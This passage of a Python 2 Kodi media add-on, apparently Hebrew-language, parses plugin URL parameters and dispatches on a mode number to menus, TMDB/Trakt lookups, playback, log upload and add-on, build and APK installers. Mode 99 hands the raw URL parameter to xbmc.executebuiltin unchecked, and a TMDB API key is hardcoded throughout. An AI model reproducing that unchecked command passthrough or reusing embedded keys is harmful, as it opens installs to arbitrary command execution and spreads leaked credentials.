        mode=int(params["mode"])
except:
        pass
try:        
        fanart=urllib.unquote_plus(params["fanart"])
except:
        pass
try:        
        description=urllib.unquote_plus(params["description"].encode('utf-8'))
except:
        pass
try:        
        data=urllib.unquote_plus(params["data"])
except:
        pass
try:        
        original_title=(params["original_title"])
except:
        pass
try:        
        tmdb=(params["id"])
except:
        pass
try:        
        season=(params["season"])
except:
        pass
try:        
        episode=(params["episode"])
except:
        pass
try:        
        tmdbid=(params["tmdbid"])
except:
        pass
try:        
        eng_name=(params["eng_name"])
except:
        pass
try:        
        show_original_year=(params["show_original_year"])
except:
        pass
try:        
        heb_name=urllib.unquote_plus(params["heb_name"])
except:
        pass
try:        
        isr=int(params["isr"])
except:
        pass
try:        
        saved_name=clean_name(params["saved_name"],1)
except:
        pass
try:        
        prev_name=(params["prev_name"])
except:
        pass
try:        
        dates=(params["dates"])
except:
        pass
try:        
        no_subs=(params["no_subs"])
except:
        pass
try:        
        image_master=urllib.unquote_plus(params["image_master"])
except:
        pass
try:        
        last_id=urllib.unquote_plus(params["last_id"])
except:
        pass
try:        
        resume=(params["resume"])
except:
        pass
try:
    file_name=(params["file_name"])
except:
        pass
try:
    c_id=(params["c_id"])
except:
        pass
try:
    m_id=(params["m_id"])
except:
        pass
try:        
        dd=(params["dd"])
except:
        pass
try:        
        nextup=(params["nextup"])
except:
        pass
try:        
        id=(params["id"]) 
except:
        pass
        
episode=str(episode).replace('+','%20')
season=str(season).replace('+','%20')
if season=='0':
    season='%20'
if episode=='0':
    episode='%20'
logging.warning('Mode:'+str(mode))
logging.warning('url:'+str(url))
#strn=get_free_space()
#xbmcgui.Dialog().ok('Error occurred',strn)
if (mode==None or url==None or len(url)<1) and len(sys.argv)>1:
        
        main_menu()
elif mode==2:
    
    file_list(url,data,last_id,description,iconimage,fanart,image_master=image_master,original_title=original_title)
elif mode==3:
    
    play(name,url,data,iconimage,fanart,no_subs,tmdb,season,episode,original_title,description,resume,dd,nextup=nextup)
elif mode==4:
    data={'type':'logout',
         'info':''
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
elif mode==5:
    data={'type':'login',
         'info':''
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning(event)
elif mode==6:
    
    search(url,data,last_id,description,iconimage,fanart,'0','0',no_subs=0)






elif mode==9:
    play_link(name,url,iconimage,fanart,no_subs,tmdb,season,episode,original_title)

elif mode==10:
    movies_menu()
elif mode==11:
    tv_show_menu()
elif mode==12:
    my_groups(last_id)
elif mode==13:
    search_groups(iconimage,fanart)
elif mode==14:
    from resources.modules.tmdb import get_movies
    get_movies(url)
elif mode==15:
    search_movies(heb_name,original_title,data,iconimage,fanart,tmdb,season,episode)
elif mode==16:
    from resources.modules.tmdb import get_seasons
    get_seasons(name,url,iconimage,fanart,description,data,original_title,tmdb,heb_name,isr)
elif mode==17:
    
    ClearCache()
elif mode==18:
    get_genere(url)
elif mode==19:
    from resources.modules.tmdb import get_episode
    get_episode(name,url,iconimage,fanart,description,data,original_title,tmdb,season,tmdbid,show_original_year,heb_name,isr)
elif mode==20:
    search_tv(heb_name,year,original_title,data,iconimage,fanart,season,episode,tmdb)

elif mode==21:
    clear_all()
elif mode==22:
    join_chan(url)
elif mode==23:
    leave_chan(name,url)
elif mode==24:
    install_addon(original_title,url)
elif mode==25:
    install_build(original_title,url)
elif mode==26:
    from resources.modules.tmdb import get_movies
    get_movies(url,local=True)
elif mode==27:
    add_tv_to_db(name,url,data,iconimage,fanart,description)
elif mode==28:
    my_local_tv()
elif mode==29:
    remove_my_tv(name,url)
elif mode==30:
    pre_searches(url,data,last_id,description,iconimage,fanart)
elif mode==31:
    tmdb_world(last_id,iconimage,fanart,data)
elif mode==32:
    install_apk(original_title,url)
elif mode==33:
    full_data_groups()
elif mode==34:
    add_to_f_d_groups(url,name,data,iconimage,fanart,description)
elif mode==35:
    remove_f_d_groups(url,name)
elif mode==36:
    download_files(original_title,url)
elif mode==37:
    clear_search_h()
elif mode==38:
    groups_join(url,iconimage,fanart)
elif mode==39:
    join_group(url)
elif mode==40:
    play_remote(url,season,episode,original_title,tmdb,file_name,description,resume,name,heb_name,c_id=c_id,m_id=m_id)
elif mode==41:
    upload_log()
elif mode==42:
    join_all_groups(url)
elif mode==43:
    upload_log(backup=True)
elif mode==44:
    set_bot_id(name)
elif mode==45:
    search_updates()
elif mode==46:
    my_repo()
elif mode==47:
    multi_install(name,url,original_title)
elif mode==48:
    clean_space()
elif mode==72: 
    by_actor(url)
elif mode==101:
    tv_neworks()
elif mode==112:
    movie_prodiction()
elif mode==113:
    search_menu()
elif mode==114:
      main_trakt()
elif mode==115:
    progress_trakt(url)
elif mode==116:
    get_trakt()
elif mode==117:
     get_trk_data(url)
elif mode==118:
    trakt_liked(url,iconimage,fanart)
elif mode==119:
    logging.warning('In mode 13')
    last_tv_subs(url)
elif mode==120:
    latest_subs(url)
elif mode==121:
    collections(url)
elif mode==122:
    collection_detials(url)
elif mode==123:
    get_tv_maze(url,iconimage)
elif mode==124:
    from resources.modules.tmdb import get_movies
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, 'הכנס מילות חיפוש כאן')
    keyboard.doModal()
    if keyboard.isConfirmed() :
           search_entered = urllib.quote_plus(keyboard.getText())
           if search_entered=='':
            sys.exit()
            

    addNolink( '[COLOR blue][I]---סרטים---[/I][/COLOR]', id,27,False,fan=' ', iconimage=' ',plot=' ')
    get_movies('http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query={0}&language={1}&append_to_response=origin_country&page=1'.format(search_entered,lang),global_s=True)
    
    addNolink( '[COLOR blue][I]---סדרות---[/I][/COLOR]', id,27,False,fan=' ', iconimage=' ',plot=' ')
    get_movies('http://api.themoviedb.org/3/search/tv?api_key=34142515d9d23817496eeb4ff1d223d0&query={0}&language={1}&page=1'.format(search_entered,lang),global_s=True)
elif mode==125:
    get_links(tv_movie,original_title,name,season_n,episode_n,season,episode,show_original_year,id)
elif mode==126: #72
    by_actor(url)
elif mode==127: #73
    actor_m(url)
elif mode==128: #74
    search_actor()
elif mode==129: #74

    vip_menu()
elif mode==130: #74

    autovipmenu()
elif mode==131: #74

    joinpack()
elif mode==132:
    groups_joinplus(url,iconimage,fanart)
elif mode==133:
    search_updatesvip()
elif mode==134:

    my_repovip()
elif mode==135:

    joinvialink()
elif mode==136:
    groups_joinautostart(url,iconimage,fanart)
elif mode==144:
   last_played()
elif mode==137:
    search_updatesstartup()
elif mode==158:
    was_i()
elif mode==159:
    remove_was_i(name,id,season,episode)
elif mode==162:
    clear_was_i()
elif mode=='adv_settings'   : groups_joinautostart(url,iconimage,fanart)
elif mode==163:
    Movienotify()
elif mode==164:
      save_to_fav(description)
elif mode==165:
      open_fav(url)
elif mode==166:
      remove_fav_num(description)
elif mode==167:
    
    searchallinone(url,data,last_id,description,iconimage,fanart,'0','0',no_subs=0)
elif mode==168:
    get_cast(url,id,season,episode)
elif mode==169: 
    actor_m(url)
elif mode==170:
    if 'tvdb' in id :
        url2='https://'+'api.themoviedb.org/3/find/%s?api_key=34142515d9d23817496eeb4ff1d223d0&external_source=tvdb_id&language=%s'%(id.replace('tvdb',''),lang)
        pre_id=requests.get(url2).json()['tv_results']
        
        if len(pre_id)>0:
            id=str(pre_id[0]['id'])
    elif 'imdb' in id:
        url2='https://'+'api.themoviedb.org/3/find/%s?api_key=34142515d9d23817496eeb4ff1d223d0&external_source=imdb_id&language=%s'%(id.replace('imdb',''),lang)
       
        pre_id=requests.get(url2).json()['tv_results']
        
        if len(pre_id)>0:
            id=str(pre_id[0]['id'])
    from resources.modules.tmdb import get_seasons
    
    get_seasons(name,url,iconimage,fanart,description,data,original_title,id,heb_name)
      
      
elif mode==171:
      play_trailer(id,tv_movie)
elif mode==99:

    xbmc.executebuiltin(url)
if len(sys.argv)>1 and exit_now==0:
    if mode!=None and mode!=15 and mode!=20:
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_DATEADDED)
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_SORT_TITLE)
        xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)
    if mode==2 or mode==12 :
        xbmcplugin.setContent(int(sys.argv[1]), 'files')
    if mode==19 :
        xbmcplugin.setContent(int(sys.argv[1]), 'episodes')
    elif mode==16 :
        xbmcplugin.setContent(int(sys.argv[1]), 'seasons')
    else:
        xbmcplugin.setContent(int(sys.argv[1]), 'movies')


   
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
   
    #td_close()
    
        
